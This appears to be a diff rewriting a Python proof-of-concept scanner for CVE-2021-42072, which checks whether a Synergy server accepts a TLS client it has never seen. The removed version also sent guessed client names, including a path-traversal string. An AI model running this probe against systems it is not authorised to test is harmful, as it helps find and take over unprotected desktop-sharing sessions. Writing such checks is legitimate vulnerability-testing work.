@@ -1,90 +1,156 @@
 #!/usr/bin/env python3
 """
-CVE-2021-42072: Authentication Bypass Scanner
-Checks if the server verifies client identity properly
+CVE-2021-42072 - server does not verify the identity of connecting clients.
+
+Synergy authenticates peers by TLS certificate fingerprint. The server keeps
+the fingerprints it trusts in <settingsPath>/tls/trusted-clients and, when
+security/checkPeerFingerprints is on, SecureSocket refuses any client whose
+certificate is not in that file. Before the fix the server performed no such
+check, so any peer that could complete a TLS handshake was accepted as a
+legitimate client and could go on to drive the session.
+
+This PoC connects with a freshly generated self-signed certificate, which by
+construction the target has never seen. What happens next is the whole test:
+
+  a server that verifies identity drops the connection right after the TLS
+  handshake and logs "fingerprint does not match trusted fingerprint"
+
+  a server that does not sends its protocol hello, at which point an unknown
+  peer is talking to it as a client, which is the vulnerability
+
+Reaching the hello is therefore proof on its own, and the check needs no
+configured screen name on the target.
+
+Note this also catches the equivalent misconfiguration on a patched build,
+security/checkPeerFingerprints set to false, because the observable behaviour
+and the consequence are identical.
+
+Exit codes: 1 VULNERABLE, 0 PASS, 2 inconclusive.
 """
 
+import argparse
+import os
 import socket
-import binascii
-import time
 import ssl
-from utils import create_ssl_context, frame_message, normalize_host
+import struct
+import subprocess
+import sys
+import tempfile
 
-def scan(host, port=24800):
-    """Test for CVE-2021-42072 authentication bypass"""
-    host = normalize_host(host)
-    context = create_ssl_context()
+HELLO_NAMES = (b"Synergy", b"Barrier")
+
+
+def make_throwaway_cert(directory):
+    """A self-signed cert the target cannot possibly have in trusted-clients."""
+    cert = os.path.join(directory, "poc.crt")
+    key = os.path.join(directory, "poc.key")
+    subprocess.run(
+        ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-days", "1",
+         "-keyout", key, "-out", cert, "-subj", "/CN=synergy-poc"],
+        check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+    )
+    return cert, key
+
+
+def read_hello(sock):
+    header = sock.recv(4)
+    if len(header) < 4:
+        return None
+    size = struct.unpack(">I", header)[0]
+    if size == 0 or size > 4096:
+        return None
+    body = b""
+    while len(body) < size:
+        chunk = sock.recv(size - len(body))
+        if not chunk:
+            break
+        body += chunk
+    return body
+
+
+def probe(host, port, cert, key, timeout):
+    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    ctx.load_cert_chain(cert, key)
 
     try:
-        with socket.create_connection((host, port), timeout=10.0) as sock:
-            ssock = context.wrap_socket(sock, server_hostname=host)
-            ssock.settimeout(5.0)
-            
-            hello = b"\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08"
-            print(f"Sending hello: {binascii.hexlify(hello).decode()}")
-            ssock.sendall(hello)
-            
-            response = ssock.recv(4096)
-            if not response:
-                print("Failed to establish connection - no response")
-                return
-            print(f"Got hello response: {binascii.hexlify(response).decode()}")
-            
-            barrier = b"\x16\x03\x03\x00\x14\x00\x00\x00\x0b\x42\x61\x72\x72\x69\x65\x72\x00\x01\x00\x08test\x00"
-            print(f"Sending barrier hello: {binascii.hexlify(barrier).decode()}")
-            ssock.sendall(barrier)
+        raw = socket.create_connection((host, port), timeout=timeout)
+    except OSError as exc:
+        print(f"[ERROR] cannot reach {host}:{port}: {exc}")
+        return 2
 
-            try:
-                response = ssock.recv(4096)
-                if response:
-                    print(f"Got barrier response: {binascii.hexlify(response).decode()}")
-            except socket.timeout:
-                print("No barrier response (timeout)")
-                
-            calv = b"\x16\x03\x03\x00\x14\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08CALV\x00"
-            ssock.sendall(calv)
-            time.sleep(0.5)
+    try:
+        sock = ctx.wrap_socket(raw)
+    except ssl.SSLError as exc:
+        print(f"[ERROR] tls handshake refused: {exc}")
+        print("        the server rejected us before identity could be checked,")
+        print("        so this run cannot tell whether the fix is present")
+        raw.close()
+        return 2
+    except OSError as exc:
+        print(f"[ERROR] connection lost during tls: {exc}")
+        raw.close()
+        return 2
 
-            test_names = [
-                b"",
-                b"test", 
-                b"Unnamed",
-                b"admin",
-                b"../../../etc/passwd",
-                b"synergy",
-                b"deskflow",
-                b"Synergy",
-                b"Deskflow",
-                b"SYNERGY",
-                b"DESKFLOW"
-            ]
-            for name in test_names:
-                try:
-                    name_msg = frame_message(b"\x00\x01\x00\x08" + name + b"\x00")
-                    print(f"\nTrying client name: {name}")
-                    ssock.sendall(name_msg)
-                    
-                    response = ssock.recv(4096)
-                    if response:
-                        print(f"Response: {binascii.hexlify(response).decode()}")
-                        if not b"EUNK" in response and not b"EBSY" in response:
-                            print(f"[!] WARNING: Server accepted unauthorized client name: {name}")
-                except:
-                    continue
-                
-                time.sleep(0.5)
+    print(f"[*] tls established, offered an untrusted self-signed certificate")
+    sock.settimeout(timeout)
+    try:
+        hello = read_hello(sock)
+    except (OSError, ssl.SSLError) as exc:
+        print(f"[*] server dropped the connection after tls: {exc}")
+        hello = None
+    finally:
+        sock.close()
 
-    except Exception as e:
-        print(f"Connection error: {e}")
-        if "connection refused" in str(e).lower():
-            print("Make sure the server is running and the port is correct")
+    if hello is None:
+        print("[PASS] server refused an unverified client after the tls handshake")
+        return 0
+
+    if hello.startswith(HELLO_NAMES):
+        version = struct.unpack(">hh", hello[7:11]) if len(hello) >= 11 else ("?", "?")
+        print(f"[*] server greeted us: {hello[:7].decode()} {version[0]}.{version[1]}")
+        print("[FAIL] server accepted a client it has never seen - VULNERABLE (CVE-2021-42072)")
+        return 1
+
+    print(f"[*] unexpected reply: {hello!r}")
+    print("[ERROR] not a synergy hello, cannot judge")
+    return 2
+
+
+def main():
+    ap = argparse.ArgumentParser(
+        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    ap.add_argument("--host", default="127.0.0.1")
+    ap.add_argument("--port", type=int, default=24800)
+    ap.add_argument("--timeout", type=float, default=10.0)
+    ap.add_argument("--cert", help="client certificate to offer (default: generate a throwaway)")
+    ap.add_argument("--key", help="private key for --cert")
+    args = ap.parse_args()
+
+    print("CVE-2021-42072 - unverified client accepted by the server")
+    print(f"target: {args.host}:{args.port}\n")
+
+    if bool(args.cert) != bool(args.key):
+        print("[ERROR] --cert and --key must be given together")
+        return 2
+
+    if args.cert:
+        return probe(args.host, args.port, args.cert, args.key, args.timeout)
+
+    with tempfile.TemporaryDirectory() as tmp:
+        try:
+            cert, key = make_throwaway_cert(tmp)
+        except (OSError, subprocess.CalledProcessError) as exc:
+            print(f"[ERROR] could not generate a certificate with openssl: {exc}")
+            print("        pass --cert and --key instead")
+            return 2
+        return probe(args.host, args.port, cert, key, args.timeout)
+
 
 if __name__ == "__main__":
-    import argparse
-    parser = argparse.ArgumentParser(description='CVE-2021-42072 Authentication Bypass Scanner')
-    parser.add_argument('--host', required=True, help='Target hostname or IP address')
-    parser.add_argument('--port', type=int, default=24800, help='Target port (default: 24800)')
-    args = parser.parse_args()
-    
-    scan(args.host, args.port)
-    
+    try:
+        sys.exit(main())
+    except KeyboardInterrupt:
+        sys.exit(130)
